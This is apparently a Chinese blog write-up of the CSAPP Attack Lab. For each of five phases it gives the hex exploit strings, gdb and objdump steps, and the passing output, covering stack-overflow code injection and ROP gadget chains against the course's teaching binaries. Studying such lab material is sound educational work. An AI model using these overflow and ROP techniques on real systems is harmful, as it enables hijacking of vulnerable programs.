---
title: CSAPP  Attack Lab 实验 
lang: zh
layout: article
show_subscribe: false
full_width: true
tags: [overflow,binary]
---


深入理解操作系统实验。Attack Lab。

## 实验环境：

* Ubuntu 20.04.4 LTS
* 用的书是深入理解计算机系统中文第三版
* GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2

## 5段实验：

按照官方所给的这部分实验的[Writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf),一共分为五个段：

| Phase | Program | Level | Method |  Function | Points |
|-|-|-|-|-|-|
|1|CTARGET|1|CI|touch1|10|
|2|CTARGET|2|CI|touch2|25|
|3|CTARGET|3|CI|touch3|25|
|4|RTARGET|2|ROP|touch2|35|
|5|RTARGET|3|ROP|touch3|5|

`CI`表示 `Code injection`。`ROP`表示`Return-oriented programming`。

就按照表中所列的顺序一个一个来,从注入开始。注意运行程序的时候要加上-q参数,不发送数据到分数服务器。

## 一：Code Injection Attacks 

### Phase 1

#### 实验目标：

在程序CTARGET中的test函数中,有漏洞的getbuf函数被调用。

* 函数test的代码：

```cpp
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

* 函数getbuf的代码：

```cpp
unsigned getbuf()
{
     char buf[BUFFER_SIZE];
     Gets(buf);
     return 1;
}
```

任务是利用getbuf函数中的漏洞，使得getbuf函数返回时返回到touch1函数的开始部分。

* touch1函数：

```cpp
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

#### 漏洞利用步骤

**a.先找出touch1函数的开始地址**

反汇编CTARGET。 

```bash
objdump -d ctarget  > ctarget.asm
```

在反汇编出的文件中搜索`touch1`,找到其起始地址为：`0x4017c0`

**b.确定出getbuf中的buffer size**

因为其为局部变量,所以在函数最开始的时候会在栈上分配空间,所以只需要检查反汇编出的指令就可以知道在栈上分配了多少空间。

* getbuf函数的反汇编指令：
```
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq   
  4017be:   90                      nop         
  4017bf:   90                      nop
```

`4017a8`处可以看出为栈上分配了0x28=40字节的空间。栈的结构可以参考书上3.7.1节的栈帧结构。

所以，构造40字节的填充+8字节的返回地址的字符串就可以了。

**c.漏洞利用**


这里还有个问题是如何输入不可打印字符。这里使用官方writeup中给出的HEX2RAW程序。利用管道操作来向`ctarget`程序中输入。ctarget.l2.txt文件中就是所构造的16进制字节序列。




```bash
./hex2raw < ctarget.l2.txt | ./ctarget
```

* 在文件ctarget.l2.txt中写入,要填入的地址为`00 00 00 00 00 40 17 c0`,写入时填为：`c0 17 40 00 00 00 00 00`,地址为小端序：

* 构造
```
64 64 64 64 64 64 64 64 
64 64 64 64 64 64 64 64 
64 64 64 64 64 64 64 64 
64 64 64 64 64 64 64 64 
64 64 64 64 64 64 64 64  /* 40字节填充 */
c0 17 40 00 00 00 00 00  /* 写入返回地址即可 */
```

其中前40字节是填充，从c0开始就是写入的地址。

**输入命令,漏洞利用：**

```bash
$ ./hex2raw < ctargetl1.txt | ./ctarget -q 
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 64 C0 17 40 00 00 00 00 00 
```


### Phase 2

#### 实验目标：

ctarget文件中touch2函数有以下源代码：

```cpp
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

任务是使得getbuf函数返回到touch2,并且需要传入cookie参数。需要插入一些指令到所构造的字符串。

实现思路是:

* 1.使得getbuf函数返回时返回到栈上的所注入的指令。
* 2.执行将cookies写入寄存器,使用ret而不是jmp,call来跳转到touch2函数,因为间接跳转需要额外的计算。

#### 漏洞利用步骤：

**a.构造漏洞利用字节序列**

从反汇编找到touch2的函数地址为:`0x4017ec`。需要写入的指令为：

```
movq $0x59b997fa, %rdi # 将cookie存入寄存器,我的为0x59b997fa。       
pushq   0x4017ec # pushq就不会影响到其他栈帧。
ret     # 需要返回到touch2 
```

~~过程的参数传递可以参考书上的3.7.3节~~

* 这里用GCC作为汇编器，OBJDUMP反汇编出机器指令。

`tmp.s`文件中写入上面的指令。然后汇编与反汇编：

```bash
gcc -c tmp.s
objdump -d tmp.o >tmp.d
```

得到tmp.d文件:

```
tmp.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 69 59    mov    $0x596997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq

```

然后用gdb动态调试，找到getbuf函数返回前,输入完成后的栈顶位置（这里为`0x5561dc78`）,插入指令代码,不需要额外计算。

构造，只影响当前栈帧。影响到其他栈帧可能会崩,之前影响到父栈帧就崩了:

```
48 c7 c7 fa 97 b9 59        /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00              /* pushq  $0x4017ec        */
c3                          /* retq                    */
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00     /* 一共48字节,最后这8字节为函数返回地址的地方   */
```

**b.实验结果：**

```bash
$ ./hex2raw <exploit.txt >exploit-raw.txt
$ ./ctarget -q <exploit-raw.txt 

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### Phase 3:

#### 实验目标：

让CTARGET执行touch3函数,而不是返回到test函数,touch3有如下函数原型：

```cpp
void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

touch3会调用hexmatch函数,hexmatch函数有如下原型：

```cpp
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

要让hexmatch返回true,这里的cookie为`59b997fa`。在调用touch3函数的时候需要传入cookie的字符串表示,以null结束。

但是有个问题,栈上空间会被hexmatch函数调用时覆盖。比如如果像下面这样，会发现调用hexmatch函数之后字符串被覆盖了。

```
35 39 62 39 39 37 66 61         /* $0x59b997fa, cookie     */
00 48 c7 c7 78 dc 61 55            /* mov    $0x5561dc78,%rdi */
68 fa 18 40 00                  /* pushq  $0x4018fa        */
c3                              /* retq                    */
00 00 
65 65 65 65 65 65 65 65    
65 65 65 65 65 65 65 65    
81 dc 61 55 00 00 00 00         /* %rsp to instruction     */
```

就只能将字符串写到调用者的栈帧里面了。

#### 漏洞利用步骤：

**a.构造字节序列**

这里将cookie写到返回地址下面,(虽然这样可能会崩，phase2这样就崩了，但没想到其他办法)。

只需要改一下上面那个失败版本就行,栈地址的更改用gdb调试一下就知道位置了。

```
48 c7 c7 a8 dc 61 55            /* mov    $0x5561dca8,%rdi */       
68 fa 18 40 00                  /* pushq  $0x4018fa ，touch3的地址  */       
c3                              /* retq                    */    
00 00 00    
65 65 65 65 65 65 65 65        
65 65 65 65 65 65 65 65        
65 65 65 65 65 65 65 65         /*  到这里有40字节 */    
78 dc 61 55 00 00 00 00         /* 返回地址,%rsp to instruction     */    
35 39 62 39 39 37 66 61         /* $59b997fa, cookie写在这个位置 */    
00
```



**结果**

```bash
$ ./hex2raw < exploit.txt >exploit-raw.txt 
$ ./ctarget <exploit-raw.txt -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```

## 二:Return-Oriented Programming

### Phase 4:

#### 实验目标:

跟Phase2目标相同，利用程序`rtarget`中的漏洞，返回时调用touch2,传入cookie。不同的是开启了栈不可执行与栈地址空间布局随机化（ASLR）。需要用的一种`Return-Oriented Programming`的方法来漏洞利用。具体可以参考这个实验的[说明](http://csapp.cs.cmu.edu/3e/attacklab.pdf)。官方说明中说可以用两个gadgets来解决这个问题。可以用movq，popq,ret,nop这4种指令类型。

**大概思路：**

1. 确定需要使用的指令。
2. 从gadget fram中找到包含这些指令的地址
3. 构造输入字节序列

#### 漏洞利用步骤:

**a.确定需要使用的指令。**

反汇编`rtarget`文件,没有找到有cookie的直接相关指令。我们需要把cookie写到栈里面去,pop到某个寄存器上,所以构造的串既有数据又有gadgets地址。然后在反汇编出的rtarget里面找可利用的指令。找的话，把反汇编出来 start_farm 和 mid_farm 之间的部分粘贴出来，然后查找。

* rtarget程序中反汇编出的 gadget farm:

```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   

```

* 找可以用哪些`movq S, D`的类型指令(S,D都是寄存器)。搜索`48 89`,只找到了`48 89 c7`,后面有`ret(c3)`，也就是说`movq %rax,%rdi`可以用。
* 找有没有`popq %rax`指令(因为在gadget fram中movq只能使用`movq %rax,%rdi`,找`popq %rax`就可以把栈上cookie弹到%rax)。搜索`58`,发现有，并且后面还有`ret(c3)`,天助我也!


所以我们的指令逻辑是：

```
popq %rax # 把cookie写到栈上弹到%rax (58 )
movq %rax,%rdi #  (实际需要：48 89 c7)  
ret     # 这里需要返回到touch2  (c3)
```

**b.从gadget fram中找到包含这些指令的地址**

1. 搜索`58`。这里就用所找到的第一个地址为:`4019ab`。`90`是nop指令。58 之后ret跳转到下一个gedget。
2. 搜索`48 89 c7`。这里用找到的`48 89 c7 c3`,地址为：`4019a2`。一个gedget解决。

刚好需要两个gadgets。

**c.构造**

开始构造:

1. 因为getbuf的栈空间是40字节。返回地址需要填第一个gedget的地址，也就是`4019ab`。
2. 然后指令会执行 popq %rax，%rsp会-8,返回地址+8的地方放我们的cookie:`59b997fa`
3. 然后popq %rax 执行完之后，就需要ret，跳转到第二个gedget的地址，也就是`4019a2`
4. 最后是touch2函数的函数地址,objdump反汇编再搜索一下即可`4017ec`。

```
65 65 65 65 65 65 65 65    
65 65 65 65 65 65 65 65    
65 65 65 65 65 65 65 65    
65 65 65 65 65 65 65 65    
65 65 65 65 65 65 65 65    
ab 19 40 00 00 00 00 00 /* 第一个gedget的地址,popq %rax，上面填充40字节 */ 
fa 97 b9 59 00 00 00 00  /* cookie  */
a2 19 40 00 00 00 00 00 /* 第二个gedget的地址，执行 movq %rax,%rdi */
ec 17 40 00 00 00 00 00 /* touch2函数的返回地址 */
```

**运行结果：**

```bash
$ ./hex2raw <exploit.txt >exploit-raw.txt 
$ ./rtarget <exploit-raw.txt  -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Phase 5:

#### 实验目标：

在有堆栈不可执行以及ASLR的情况下实现Phase3的目标。以前传入cookie的指针是硬编码栈上地址弄的,这里显然不行了。找的范围从start_farm到mid_farm,扩展为start_farm到end_farm了。

首先清晰的是只能把cookie写到最后,因为如果写到touch3函数地址上面，会被污染。

* 观察到farm中发现有这样一条地址传送指令可以用：

```
4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
```

感觉可以通过这种方式将(%rsp+x)的地址传送到%rax。先在getdets farm里搜索一下可用资源。

* 搜索一下能用的popq指令：

```
popq %rax ; (58) 地址:4019ab

popq %rsp ;这个感觉没用，但这个后面接的这个可能有用
movl %eax,%edx ; (89 c2 90 c3) 地址：4019dd
```
* 搜索一下能用的movq指令：

```
movq %rax,%rdi ; (48 89 c7) 地址：4019a2

movq %rsp,%rax ;(48 89 e0) 地址：401a06
```

* 因为围绕`lea    (%rdi,%rsi,1),%rax`指令,所以再找一下能改变%rsi的指令:

```
movl %ecx,%esi ;(89 ce) 地址:401a13
```

* 找可以改变%ecx的指令的用有哪些指令：

```
movl %edx,%ecx; (89 d1) 地址：401a34
```

感觉差不多够了，不够再找，试着拼接一下，拼接的指令执行逻辑大概是:

```

popq %rax ; 这是栈里面放的是偏移

movl %eax,%edx 

movl %edx,%ecx

movl %ecx,%esi  ;就为了从%eax导到%esi

movq %rsp,%rax  

movq %rax,%rdi 

lea    (%rdi,%rsi,1),%rax 

movq %rax,%rdi
ret ;这里返回到touch3
```

感觉够了。Brutal! 指令竟然这么多。

#### 漏洞利用步骤：

**a.按照上面的指令逻辑开始构造**

```
AA AA AA AA AA AA AA AA 
AA AA AA AA AA AA AA AA 
AA AA AA AA AA AA AA AA 
AA AA AA AA AA AA AA AA 
AA AA AA AA AA AA AA AA  /*  40字节  */
ab 19 40 00 00 00 00 00   /*  4019ab: popq %rax  返回到第一条指令  */
20 00 00 00 00 00 00 00   /* cookie 的偏移,需要计算一下,movq %rsp,%rax指令处开始计算 */
dd 19 40 00 00 00 00 00   /* movl %eax,%edx ;  地址：4019dd */
34 1a 40 00 00 00 00 00   /* movl %edx,%ecx;  地址：401a34 */
13 1a 40 00 00 00 00 00  /* movl %ecx,%esi ; 地址:401a13 */
06 1a 40 00 00 00 00 00  /* movq %rsp,%rax ; 地址：401a06 */
a2 19 40 00 00 00 00 00  /* movq %rax,%rdi ;  地址：4019a2 */
d6 19 40 00 00 00 00 00  /* 4019d6:   lea (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00  /* movq %rax,%rdi ;  地址：4019a2 */
fa 18 40 00 00 00 00 00  /* 4018fa:touch3 函数地址 */
35 39 62 39 39 37 66 61         /* $0x59b997fa, cookie     */
00 
```

**实验结果：**

```bash
$ ./hex2raw <exploit.txt >exploit-raw.txt 
$ ./rtarget <exploit-raw.txt  -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:3:AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
```

## 参考资料：

* [csapp Attack lab](http://csapp.cs.cmu.edu/3e/attacklab.pdf)

